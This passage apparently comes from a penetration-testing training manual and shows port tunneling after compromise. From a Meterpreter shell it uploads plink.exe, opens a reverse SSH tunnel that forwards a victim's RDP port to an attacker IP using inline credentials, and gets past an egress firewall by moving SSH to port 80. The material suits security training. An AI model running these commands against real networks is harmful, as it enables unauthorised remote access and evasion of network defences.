    # 18.6.4 - Port Tunneling


    We currently have a low privileged domain shell on Mike''s machine, which is located
    in the internal management network. A quick examination of listening ports shows
    that Remote Desktop services are running, which gives us the idea to tunnel out
    the RDP port on Mike''s machine to our attacking box.


    ```

    meterpreter > upload /usr/share/windows-binaries/plink.exe c:\Windows\temp

    meterpreter > shell

    ...

    C:\Windows\temp\plink -l root -pw pass -R 3389:127.0.0.1:3389 208.68.234.99

    ```


    Our attempt to create a tunnel fails due to egress firewall rules in the management
    network; these are blocking outbound connections to TCP port 22. We set the SSH
    daemon to listen on our attacking machine on port 80 and we retry the outbound
    tunnel connection.'
